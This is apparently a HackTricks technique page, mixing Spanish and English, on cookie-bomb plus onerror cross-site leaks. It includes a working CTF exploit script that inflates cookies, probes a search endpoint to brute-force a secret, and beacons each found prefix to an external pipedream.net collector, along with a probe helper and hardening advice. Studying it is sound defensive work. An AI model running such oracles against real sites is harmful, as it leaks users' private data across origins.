# Cookie Bomb + Onerror XS Leak

{{#include ../../banners/hacktricks-training.md}}

Esta técnica combina:
- Cookie bombing: rellenar el navegador de la víctima con muchas/grandes cookies para el target origin de modo que las solicitudes posteriores alcancen límites del servidor/solicitud (tamaño de request headers, tamaño de la URL en redirects, etc.).
- Error-event oracle: sondear un endpoint cross-origin con un <script> (u otro subresource) y distinguir estados con onload vs onerror.

Idea general
- Encuentra un endpoint target cuyo comportamiento difiera entre dos estados que quieres probar (p. ej., search “hit” vs “miss”).
- Asegura que la ruta “hit” desencadene una heavy redirect chain o una URL larga mientras la ruta “miss” se mantiene corta. Infla los request headers usando muchas cookies de modo que solo la ruta “hit” haga que el servidor falle con un HTTP error (p. ej., 431/414/400). El error invierte el evento onerror y se convierte en un oracle para XS-Search.

Cuándo funciona esto
- Puedes provocar que el navegador de la víctima envíe cookies al target (p. ej., las cookies son SameSite=None o puedes establecerlas en un first-party context vía un popup window.open).
- Hay una funcionalidad de la app que puedes abusar para establecer cookies arbitrarias (p. ej., endpoints de “save preference” que convierten nombres/valores controlados en Set-Cookie) o para hacer post-auth redirects que incorporen datos controlados por el atacante en la URL.
- El servidor reacciona de forma distinta en los dos estados y, con headers/URL inflados, un estado cruza un límite y devuelve una respuesta de error que dispara onerror.

Nota sobre errores del servidor usados como el oracle
- 431 Request Header Fields Too Large se devuelve comúnmente cuando las cookies inflan los request headers; 414 URI Too Long o un 400 específico del servidor pueden devolverse para targets con requests largos. Cualquiera de estos resulta en una carga fallida del subresource y dispara onerror. [MDN documents 431 and typical causes like excessive cookies.]()

Ejemplo práctico (angstromCTF 2022)
El siguiente script (de un writeup público) abusa de una función que permite al atacante insertar cookies arbitrarias, luego carga un search endpoint cross-origin como un script. Cuando la query es correcta, el servidor realiza un redirect que, junto con el cookie bloat, excede los límites del servidor y devuelve un error status, por lo que script.onerror se dispara; de lo contrario no sucede nada.
```html
<>'";
<form action="https://sustenance.web.actf.co/s" method="POST">
<input id="f" /><input name="search" value="a" />
</form>
<script>
const $ = document.querySelector.bind(document)
const sleep = (ms) => new Promise((r) => setTimeout(r, ms))
let i = 0
const stuff = async (len = 3500) => {
let name = Math.random()
$("form").target = name
let w = window.open("", name)
$("#f").value = "_".repeat(len)
$("#f").name = i++
$("form").submit()
await sleep(100)
}
const isError = async (url) => {
return new Promise((r) => {
let script = document.createElement("script")
script.src = url
script.onload = () => r(false)
script.onerror = () => r(true)
document.head.appendChild(script)
})
}
const search = (query) => {
return isError(
"https://sustenance.web.actf.co/q?q=" + encodeURIComponent(query)
)
}
const alphabet =
"etoanihsrdluc_01234567890gwyfmpbkvjxqz{}ETOANIHSRDLUCGWYFMPBKVJXQZ"
const url = "//en4u1nbmyeahu.x.pipedream.net/"
let known = "actf{"
window.onload = async () => {
navigator.sendBeacon(url + "?load")
await Promise.all([stuff(), stuff(), stuff(), stuff()])
await stuff(1600)
navigator.sendBeacon(url + "?go")
while (true) {
for (let c of alphabet) {
let query = known + c
if (await search(query)) {
navigator.sendBeacon(url, query)
known += c
break
}
}
}
}
</script>
```
¿Por qué el popup (window.open)?
- Los navegadores modernos bloquean cada vez más los third-party cookies. Abrir una ventana de nivel superior hacia el target convierte las cookies en first-party, de modo que las respuestas Set-Cookie del target perdurarán, habilitando el paso cookie-bomb incluso con restricciones de third-party cookies.

Ayudante genérico de sondeo
Si ya tienes una forma de establecer muchas cookies en el target origin (first-party), puedes reutilizar este minimal oracle contra cualquier endpoint cuyo éxito/fracaso conduzca a distintos resultados de red (status/MIME/redirect):
```js
function probeError(url) {
return new Promise((resolve) => {
const s = document.createElement('script');
s.src = url;
s.onload = () => resolve(false);  // loaded successfully
s.onerror = () => resolve(true);  // failed (e.g., 4xx/5xx, wrong MIME, blocked)
document.head.appendChild(s);
});
}
```
Tips to build the oracle
- Force the “positive” state to be heavier: chain an extra redirect only when the predicate is true, or make the redirect URL reflect unbounded user input so it grows with the guessed prefix.
- Inflate headers: repeat cookie bombing until a consistent error is observed on the “heavy” path. Servers commonly cap header size and will fail sooner when many cookies are present.
- Stabilize: fire multiple parallel cookie set operations and probe repeatedly to average out timing and caching noise.

Related XS-Search tricks
- URL length based oracles (no cookies needed) can be combined or used instead when you can force a very long request target:

{{#ref}}
url-max-length-client-side.md
{{#endref}}

Defenses and hardening
- Make success/failure responses indistinguishable:
- Avoid conditional redirects or large differences in response size between states. Return the same status, same content type, and similar body length regardless of state.
- Block cross-site subresource probes:
- SameSite cookies: set sensitive cookies to SameSite=Lax or Strict so subresource requests like <script src> don’t carry them; prefer Strict for auth tokens when possible.
- Fetch Metadata: enforce a Resource Isolation Policy to reject cross-site subresource loads (e.g., if Sec-Fetch-Site != same-origin/same-site).
- Cross-Origin-Resource-Policy (CORP): set CORP: same-origin (or at least same-site) for endpoints not meant to be embedded as cross-origin subresources.
- X-Content-Type-Options: nosniff and correct Content-Type on JSON/HTML endpoints to avoid load-as-script quirks.
- Reduce header/URL amplification:
- Cap the number/size of cookies set; sanitize features that turn arbitrary form fields into Set-Cookie.
- Normalize or truncate reflected data in redirects; avoid embedding attacker-controlled long strings in Location URLs.
- Keep server limits consistent and fail uniformly (avoid special error pages only for one branch).

Notes
- This class of attacks is discussed broadly as “Error Events” XS-Leaks. The cookie-bomb step is just a convenient way to push only one branch over server limits, producing a reliable boolean oracle.



## References
- XS-Leaks: Error Events (onerror/onload as an oracle): https://xsleaks.dev/docs/attacks/error-events/
- MDN: 431 Request Header Fields Too Large (common with many cookies): https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/431
{{#include ../../banners/hacktricks-training.md}}
